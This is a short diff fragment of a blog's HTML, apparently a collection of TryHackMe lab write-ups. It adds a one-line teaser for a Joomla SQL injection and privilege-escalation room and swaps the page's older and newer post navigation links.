+  Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.
+
+
+And we are give...</p>
               </div>
             </div>
           </a>
@@ -1352,22 +1506,18 @@ Additonally, we are given the target IP 10.10.13.83. Our objectives are as follo
 
   
     <a
-      href="/posts/skynet/"
+      href="/posts/relevant/"
       class="btn btn-outline-primary"
       aria-label="Older"
     >
-      <p>TryHackMe Skynet</p>
+      <p>TryHackMe Relevant</p>
     </a>
   
 
   
-    <a
-      href="/posts/relevant/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>TryHackMe Relevant</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
